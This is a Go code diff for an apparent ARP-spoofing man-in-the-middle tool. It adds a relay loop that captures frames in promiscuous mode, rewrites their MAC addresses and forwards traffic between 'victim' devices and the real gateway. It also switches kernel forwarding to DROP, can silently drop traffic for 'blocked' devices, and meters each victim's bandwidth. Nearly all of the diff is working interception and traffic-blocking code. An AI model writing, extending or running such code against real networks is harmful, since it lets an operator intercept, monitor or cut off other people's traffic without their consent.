@@ -21,6 +21,8 @@ import (
 	"github.com/miekg/dns"
 )
 
+const maxFrame = 1500 + 14
+
 type nameCh struct {
 	name string
 	ip   string
@@ -38,9 +40,20 @@ type DeviceMap struct {
 	mu      *sync.RWMutex
 }
 
+// type BlockedDevices struct {
+// 	ds map[string]bool
+// 	mu *sync.RWMutex
+// }
+
 // look into this
 func (d *Device) tick() {
 	now := time.Now()
+	if d.lastMeasure.IsZero() {
+		d.prevBytesSent = d.BytesSent
+		d.prevBytesRecv = d.BytesReceived
+		d.lastMeasure = now
+		return
+	}
 	elapsed := now.Sub(d.lastMeasure).Seconds()
 	if elapsed < 0.001 {
 		return
@@ -95,20 +108,21 @@ func (e *Engine) DeviceByIP(ip string) (*Device, bool) {
 	return nil, false
 }
 
-func BlockDevice(d *Device) error {
-	if err := setDeviceForwardBlock(d.IP, true); err != nil {
-		return err
-	}
+func BlockDevice(d *Device) {
 	d.Blocked = true
-	return nil
 }
 
-func UnblockDevice(d *Device) error {
-	if err := setDeviceForwardBlock(d.IP, false); err != nil {
-		return err
-	}
+func UnblockDevice(d *Device) {
 	d.Blocked = false
-	return nil
+}
+
+func blockForwardingForDev(ifaces []string) {
+	SetNetworkForwardState(ifaces, FORWARD_DROP)
+	state := GetNetworkForwardState(ifaces)
+	if state != FORWARD_DROP {
+		// panic("forwarding state is not drop: " + state)
+		log.Println("forwarding state is not drop")
+	}
 }
 
 // 1. setup rcv loop //listens for replys from the send loop but we set it up first so we don't miss any replys // device chanel
@@ -133,18 +147,19 @@ func Start(e *Engine) {
 	defer handle.Close()
 
 	ifaces := []string{host.Interface, host.ifaceName}
-	state := GetNetworkForwardState(ifaces)
+	blockForwardingForDev(ifaces)
 
-	log.Println("state", state)
-	if state != FORWARD_ACCEPT {
-		err := SetNetworkForwardState(ifaces, FORWARD_ACCEPT)
-		if err != nil {
-			panic(err)
-		}
-		if GetNetworkForwardState(ifaces) != FORWARD_ACCEPT {
-			panic(fmt.Errorf("couldn't enable forwarding state :(%s) for dev (%s)", state, host.Interface))
-		}
-	}
+	// state := GetNetworkForwardState(ifaces)
+	// log.Println("state", state)
+	// if state != FORWARD_ACCEPT {
+	// 	err := SetNetworkForwardState(ifaces, FORWARD_ACCEPT)
+	// 	if err != nil {
+	// 		panic(err)
+	// 	}
+	// 	if GetNetworkForwardState(ifaces) != FORWARD_ACCEPT {
+	// 		panic(fmt.Errorf("couldn't enable forwarding state :(%s) for dev (%s)", state, host.Interface))
+	// 	}
+	// }
 
 	// TeardownLimiter(host.Interface)
 	// err = InitLimiter(host.Interface)
@@ -194,6 +209,129 @@ func Start(e *Engine) {
 			ds.mu.Unlock()
 		}
 	}
+}
+
+func Relay(devices DeviceMap, host Device, ctx context.Context, errChan chan error) {
+	// Own handle: a pcap handle may only be read by one goroutine, and ArpRCV
+	// already owns the one opened in Start.
+	inactive, err := pcap.NewInactiveHandle(host.Interface)
+	if err != nil {
+		return
+	}
+	defer inactive.CleanUp()
+
+	if err := inactive.SetSnapLen(65536); err != nil {
+		return
+	}
+	if err := inactive.SetPromisc(true); err != nil {
+		return
+	}
+	if err := inactive.SetImmediateMode(true); err != nil {
+		return
+	}
+
+	handle, err := inactive.Activate()
+	if err != nil {
+		errChan <- err
+		log.Println("relay: open failed:", err)
+		return
+	}
+	defer handle.Close()
+
+	hostMAC := net.HardwareAddr(host.MAC)
+	hostIP := host.IP
+
+	// Only frames addressed to us can be transit. This one clause also drops
+	// broadcast, multicast, and our own injected frames.
+	filter := "ether dst " + hostMAC.String() + " and ip"
+	if err := handle.SetBPFFilter(filter); err != nil {
+		errChan <- err
+		log.Println("relay: bpf failed:", err)
+		return
+	}
+
+	packetsCh := gopacket.NewPacketSource(handle, handle.LinkType()).PacketsCtx(ctx)
+
+	for packet := range packetsCh {
+		if ctx.Err() != nil {
+			return
+		}
+
+		data := packet.Data()
+		if len(data) < 34 { // 14 Ethernet + 20 minimal IPv4
+			continue
+		}
+		if net.HardwareAddr(data[6:12]).String() == hostMAC.String() {
+			continue // our own injection, reflected back
+		}
+		capture := packet.Metadata().CaptureInfo
+		if capture.CaptureLength < capture.Length {
+			continue
+		}
+		if len(packet.Data()) > 1514 {
+			continue
+		}
+		ipLayer := packet.Layer(layers.LayerTypeIPv4)
+		if ipLayer == nil {
+			continue
+		}
+		ip4 := ipLayer.(*layers.IPv4)
+		src, dst := ip4.SrcIP, ip4.DstIP
+
+		if src.Equal(hostIP) || dst.Equal(hostIP) {
+			continue // our own traffic
+		}
+
+		nextHop, ok := relayNextHop(devices, src, dst)
+		if !ok || nextHop == nil || nextHop.String() == hostMAC.String() {
+			continue
+		}
+
+		copy(data[0:6], nextHop)  // Ethernet dst -> the real next hop
+		copy(data[6:12], hostMAC) // Ethernet src -> us
+		err := handle.WritePacketData(data)
+		if err != nil {
+			log.Println("relay: inject failed:", err)
+		}
+	}
+}
+
+// relayNextHop decides where a transit frame is really headed and returns the
+// MAC of the next hop, or ok=false when the frame is not ours to move.
+func relayNextHop(devices DeviceMap, src, dst net.IP) (net.HardwareAddr, bool) {
+	devices.mu.RLock()
+	var srcDev, dstDev *Device
+	for _, d := range devices.Devices {
+		if d.IP.Equal(dst) {
+			dstDev = d
+		}
+		if d.IP.Equal(src) {
+			srcDev = d
+		}
+	}
+	devices.mu.RUnlock()
+
+	// internet/LAN -> victim: deliver straight to the victim.
+	if dstDev != nil {
+		if dstDev.Blocked {
+			return nil, false
+		}
+		return net.HardwareAddr(dstDev.MAC), true
+	}
+
+	// victim -> internet: hand it back to the real gateway.
+	if srcDev != nil {
+		if srcDev.Blocked {
+			return nil, false
+		}
+		gw := gateWay.Load()
+		if gw == nil {
+			return nil, false
+		}
+		return gw.mac, true
+	}
+
+	return nil, false
 }
 
 func maxSubnet(host Device) []byte {
@@ -259,13 +397,32 @@ func ArpSendRequests(host Device, handle *pcap.Handle, ctx context.Context, errC
 }
 
 func IpTrafficMonitor(devices DeviceMap, host Device, ctx context.Context, errChan chan error) {
-	handle, err := pcap.OpenLive(host.Interface, 1600, true, 1000*time.Millisecond)
+	// Own handle: a pcap handle may only be read by one goroutine, and ArpRCV
+	// already owns the one opened in Start.
+	inactive, err := pcap.NewInactiveHandle(host.Interface)
+	if err != nil {
+		return
+	}
+	defer inactive.CleanUp()
+
+	if err := inactive.SetSnapLen(65536); err != nil {
+		return
+	}
+	if err := inactive.SetPromisc(true); err != nil {
+		return
+	}
+	if err := inactive.SetImmediateMode(true); err != nil {
+		return
+	}
+
+	handle, err := inactive.Activate()
 	if err != nil {
 		errChan <- err
-		log.Println("Error opening device:", err)
+		log.Println("relay: open failed:", err)
+		return
 	}
 	defer handle.Close()
-	err = handle.SetBPFFilter("ip")
+	err = handle.SetBPFFilter("ether dst " + net.HardwareAddr(host.MAC).String() + " and ip")
 	if err != nil {
 		errChan <- err
 		log.Println("Error setting filter for ip:", err)
@@ -276,35 +433,40 @@ func IpTrafficMonitor(devices DeviceMap, host Device, ctx context.Context, errCh
 	)
 
 	packetsCh := packetSource.PacketsCtx(ctx)
-	var n int
+	ticker := time.NewTicker(time.Second)
+	defer ticker.Stop()
+
 	for {
 		select {
 		case <-ctx.Done():
 			return
-		case packet := <-packetsCh:
+		case <-ticker.C:
+			devices.mu.Lock()
+			for _, d := range devices.Devices {
+				d.tick()
+			}
+			devices.mu.Unlock()
+		case packet, ok := <-packetsCh:
+			if !ok {
+				return
+			}
 			ipLayer := packet.Layer(layers.LayerTypeIPv4)
 			if ipLayer == nil {
-				log.Println("ip layer is nil")
 				continue
 			}
 
 			ip := ipLayer.(*layers.IPv4)
 			src := ip.SrcIP
 			dst := ip.DstIP
-			n++
-			if n%100 == 0 {
-				fmt.Printf("traffic goroutine: saw %d ip packets\n", n)
-				fmt.Printf("sample src=%s dst=%s\n", ip.SrcIP, ip.DstIP)
-			}
+			bytes := int64(ip.Length)
 			devices.mu.Lock()
 			for _, d := range devices.Devices {
 				if d.IP.Equal(src) {
-					d.BytesSent += int64(packet.Metadata().CaptureInfo.Length)
+					d.BytesSent += bytes
 				}
 				if d.IP.Equal(dst) {
-					d.BytesReceived += int64(packet.Metadata().CaptureInfo.Length)
+					d.BytesReceived += bytes
 				}
-				d.tick()
 			}
 			devices.mu.Unlock()
 		}
